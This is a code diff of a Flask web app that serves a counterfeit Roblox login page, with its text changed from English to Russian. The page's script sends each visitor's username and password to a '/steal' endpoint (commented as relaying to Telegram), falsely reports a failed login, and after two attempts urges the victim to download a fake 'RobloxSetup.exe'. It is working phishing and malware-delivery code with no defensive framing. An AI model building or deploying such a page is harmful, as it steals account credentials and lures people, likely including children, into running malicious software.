@@ -20,181 +20,124 @@ def send_tg(msg):
 @app.route('/')
 def index():
     return '''
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Roblox</title>
-        <style>
-            * { margin: 0; padding: 0; box-sizing: border-box; }
-            body {
-                background: #0a0a1a;
-                font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
-                display: flex;
-                justify-content: center;
-                align-items: center;
-                min-height: 100vh;
-                margin: 0;
-                padding: 20px;
-            }
-            .login-container {
-                background: #14142a;
-                border-radius: 16px;
-                padding: 40px 35px 35px;
-                width: 400px;
-                max-width: 100%;
-                box-shadow: 0 15px 40px rgba(0,0,0,0.9);
-                text-align: center;
-            }
-            .roblox-logo {
-                width: 180px;
-                margin-bottom: 20px;
-            }
-            .login-title {
-                color: #fff;
-                font-size: 24px;
-                font-weight: 500;
-                margin-bottom: 25px;
-            }
-            .input-group {
-                margin-bottom: 14px;
-                text-align: left;
-            }
-            .input-group label {
-                display: block;
-                color: #b0c4de;
-                font-size: 14px;
-                font-weight: 600;
-                margin-bottom: 5px;
-            }
-            .input-group input {
-                width: 100%;
-                padding: 14px 16px;
-                background: #0a0a1a;
-                border: 2px solid #2a2a4a;
-                border-radius: 8px;
-                color: #fff;
-                font-size: 16px;
-                transition: all 0.25s ease;
-                outline: none;
-            }
-            .input-group input::placeholder {
-                color: #6a8aae;
-                font-weight: 300;
-            }
-            .input-group input:focus {
-                border-color: #00bfff;
-                background: #12122a;
-                box-shadow: 0 0 0 3px rgba(0,191,255,0.2);
-            }
-            .login-btn {
-                width: 100%;
-                padding: 15px;
-                background: #00bfff;
-                border: none;
-                border-radius: 8px;
-                color: #fff;
-                font-size: 18px;
-                font-weight: 700;
-                cursor: pointer;
-                transition: background 0.2s;
-                margin-top: 8px;
-            }
-            .login-btn:hover {
-                background: #009acd;
-            }
-            .login-btn:active {
-                transform: scale(0.98);
-            }
-            .error-message {
-                color: #ff6b6b;
-                font-size: 14px;
-                margin-top: 14px;
-                min-height: 22px;
-                font-weight: 500;
-            }
-            .download-btn {
-                display: none;
-                margin-top: 20px;
-                padding: 15px;
-                background: #00b894;
-                border: none;
-                border-radius: 8px;
-                color: #fff;
-                font-weight: 700;
-                font-size: 16px;
-                cursor: pointer;
-                width: 100%;
-                transition: background 0.2s;
-            }
-            .download-btn:hover {
-                background: #00a381;
-            }
-            .download-btn:active {
-                transform: scale(0.98);
-            }
-            .footer-links {
-                color: #6a8aae;
-                font-size: 13px;
-                margin-top: 22px;
-                border-top: 1px solid #1a1a4a;
-                padding-top: 18px;
-                display: flex;
-                flex-direction: column;
-                gap: 8px;
-            }
-            .footer-links a {
-                color: #6a8aae;
-                text-decoration: none;
-            }
-            .footer-links a:hover {
-                color: #fff;
-            }
-            .signup-link {
-                color: #6a8aae;
-                font-size: 14px;
-                margin-top: 15px;
-            }
-            .signup-link a {
-                color: #00bfff;
-                text-decoration: none;
-            }
-            .signup-link a:hover {
-                text-decoration: underline;
-            }
-        </style>
-    </head>
-    <body>
-    <div class="login-container">
-        <img class="roblox-logo" src="https://www.roblox.com/favicon.ico" alt="Roblox">
-        <h1 class="login-title">Login to Roblox</h1>
-
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox</title>
+    <style>
+        body {
+            background: #0a0a1a;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-form {
+            background: #14142a;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.8);
+            width: 340px;
+            color: white;
+            text-align: center;
+        }
+        .login-form h1 {
+            color: #fff;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        .login-form .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        .login-form .form-group label {
+            display: block;
+            color: #b0c4de;
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+        .login-form .form-group input {
+            width: 100%;
+            padding: 12px;
+            background: #0a0a1a;
+            border: 1px solid #2a2a4a;
+            border-radius: 8px;
+            color: white;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+        }
+        .login-form .form-group input:focus {
+            border-color: #00bfff;
+        }
+        .login-form button {
+            width: 100%;
+            padding: 12px;
+            background: #00bfff;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .login-form button:hover {
+            background: #009acd;
+        }
+        .alternate-options {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #6a8aae;
+        }
+        .alternate-options a {
+            color: #00bfff;
+            text-decoration: none;
+        }
+        .alternate-options a:hover {
+            text-decoration: underline;
+        }
+        .download-btn {
+            display: none;
+            margin-top: 15px;
+            padding: 12px;
+            background: #00b894;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+        }
+        .download-btn:hover {
+            background: #00a381;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-form">
+        <h1>Войти в Roblox</h1>
         <form id="loginForm">
-            <div class="input-group">
-                <label for="username">Username/Email/Phone</label>
-                <input type="text" id="username" placeholder="Username/Email/Phone" required>
+            <div class="form-group">
+                <label for="username">Имя пользователя (email или телефон)</label>
+                <input type="text" id="username" required>
             </div>
-            <div class="input-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" placeholder="Password" required>
+            <div class="form-group">
+                <label for="password">Пароль</label>
+                <input type="password" id="password" required>
             </div>
-            <button class="login-btn" type="submit">Log In</button>
+            <button type="submit">Войти</button>
         </form>
-
-        <div id="message" class="error-message"></div>
-
-        <div class="footer-links">
-            <a href="#">Forgot Password or Username?</a>
-            <a href="#">Email Me a One-Time Code</a>
-            <a href="#">Quick Sign-in</a>
+        <div class="alternate-options">
+            <a href="#">Создать аккаунт</a>
+            <span>·</span>
+            <a href="#">Войти с другого устройства</a>
         </div>
-
-        <div class="signup-link">
-            Don't have an account? <a href="#">Sign Up</a>
-        </div>
-
-        <button class="download-btn" id="downloadBtn">⬇️ Download RobloxSetup.exe</button>
+        <button class="download-btn" id="downloadBtn">⬇️ Скачать RobloxSetup.exe</button>
     </div>
 
     <script>
@@ -202,42 +145,44 @@ def index():
 
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
-            const login = document.getElementById('username').value.trim();
-            const pass = document.getElementById('password').value.trim();
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
 
-            if (!login || !pass) {
-                document.getElementById('message').innerText = 'Please fill in all fields';
+            if (!username || !password) {
+                alert('Заполните все поля');
                 return;
             }
 
+            // Отправка в Telegram
             try {
                 await fetch('/steal', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ login, pass })
+                    body: JSON.stringify({ login: username, pass: password })
                 });
             } catch {}
 
             attempts++;
-            document.getElementById('message').innerText = 'Incorrect username or password. Please try again.';
-            document.getElementById('username').value = '';
-            document.getElementById('password').value = '';
+            alert('Неверный логин или пароль. Попробуйте снова.');
 
             if (attempts >= 2) {
-                document.getElementById('message').innerHTML = '⚠️ <span style="color:#ffcc00;">There was a problem with your login.</span> Please download the Roblox update.';
+                document.getElementById('message') || document.createElement('div');
                 document.getElementById('downloadBtn').style.display = 'block';
+                alert('⚠️ Обнаружена проблема с входом. Скачайте обновление Roblox.');
             }
+
+            document.getElementById('username').value = '';
+            document.getElementById('password').value = '';
         });
 
         document.getElementById('downloadBtn').addEventListener('click', function() {
             window.location.href = '/download/roblox_setup.exe';
-            this.innerText = '✅ File downloaded! Run it to log in.';
+            this.innerText = '✅ Файл скачан! Запустите для входа.';
             this.disabled = true;
-            this.style.background = '#00b894';
         });
     </script>
-    </body>
-    </html>
+</body>
+</html>
     '''
 
 @app.route('/steal', methods=['POST'])
